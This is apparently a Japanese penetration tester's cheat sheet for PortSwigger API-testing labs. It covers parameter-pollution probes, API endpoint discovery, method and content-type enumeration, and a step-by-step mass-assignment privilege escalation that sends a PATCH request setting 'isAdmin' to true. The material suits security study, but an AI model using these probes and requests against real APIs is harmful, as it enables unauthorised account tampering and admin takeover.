

#### 注目ポイント

- Forgot password機能： Please enter your username
- Update your email
- JSON形式のレスポンス
- `/api~`リクエスト

---
## Detect

#### Server-side parameter pollutionの場合

- サーバ側で正規のパラメタの値を上書きしたり不正に機密情報を窃取する攻撃-> [詳細：PortSwigger](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution)
- POSTリクエスト × アクション(メール変更、パスワードリセット等)でみられる。平文だけでなくJSONやXML等構造化データもあり得る

###### Server-side parameter pollution?

- Backslash Powererd Scannerによって"Suspicious input transformation"が検知されたときはほぼ確実
- 正当なパラメタの後ろに`#`や`&`を付与し(urlencode)、レスポンスがフィールド情報を示唆するものであれば検知
```
username=administrator#hoge
```
```
username=administrator&hoge
```
-> [💥API testing](💥API%20testing.md#Server-side%20parameter%20pollution)


↓その他

### APIエンドポイントを発見する

- `GET /` に対してAPIのエンドポイント[wordlist](https://github.com/chrislockard/api_wordlist/blob/master/common_paths.txt)でbrute-forceする
	or
- 1通り探索したあと、HTTP historyでapiへのリクエストを確認する(ログイン後の探索がいい)
	or
- Scannerでpassive scanで自動的に検出される
	or
- Extension: JS Link finderからJavaScriptファイル内でAPIエンドポイントへの参照を見つける

- エンドポイントを特定したらベースのpathも閲覧すること。重要情報が得られることもある
	- `/api/example/v1/users/123`↓
		- `/api/example/v1`
		- `/api/example`
		- `/api`

---
### 有効なHTTPリクエスト作成のためのAPIエンドポイントについての調査

###### 利用可能なHTTPメソッドの特定

- 発見したAPIエンドポイントで、かつ重要でないオブジェクトを扱うものに対してIntruderにかける
- Payload type: Simple list -> Add from list -> HTTP verbs
```
§GET§ /api/v1/重要でないオブジェクト
```

###### 利用可能なContent-Typeヘッダの特定

- 発見したAPIエンドポイントに対してContent type convertorを使用しリクエスト
 - Errorによる役立つ情報の開示はあるか？
 - Content-Typeを変更してもエラーはないか？

###### 利用可能なパラメタの検出

- 発見したAPIエンドポイントに対して、Param Miner -> Guess GET parameters

---

# Exploitation

###### 使用されてないエンドポイントを悪用する

- [API testing](API%20testing.md#有効なHTTPリクエスト作成のためのAPIエンドポイントについての調査)で発見したHTTPメソッドや`Content-Type`を使用して任意の値に変更する

[Lab: Finding and exploiting an unused API endpoint](https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint)

---
## Mass assignmentを利用したPrivEsc

- Mass assignment = 隠しパラメタ or 他のエンドポイントへのリクエストに使用されるパラメタを使用して攻撃者の意図する値に変更されること

1. あるAPIエンドポイントへのリクエストorレスポンスのパラメタを観察する
```json
{ 
	"username": "wiener", 
	"email": "wiener@example.com", 
}
```

2. 同様に、他のAPIエンドポイントへのリクエストorレスポンスのパラメタを観察する
```json
{ 
	"id": 123, 
	"name": "John Doe", 
	"email": "john@example.com", 
	"isAdmin": "false" 
}
```

3. `PATCH`メソッド or `POST`メソッドリクエストで、他のエンドポイントで使用されているパラメタを使ってみる

- まずは正常な値を入力し、エラーが返らないか確認する
```http
PATCH /api/users/
...

{ 
	"username": "wiener", 
	"email": "wiener@example.com", 
	"isAdmin": false, 
}
```

- 次に、適当な値を入力し、エラーが返るか確認する。エラーが返る＝パラメタを正常に更新できている
```http
...
	"isAdmin": hogehoge, 
}
```

4. パラメタの値を改変しリクエスト。PrivEsc完了
```http
PATCH /api/users/
...

{ 
	"username": "wiener", 
	"email": "wiener@example.com", 
	"isAdmin": true, 
}
```

[Lab: Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)

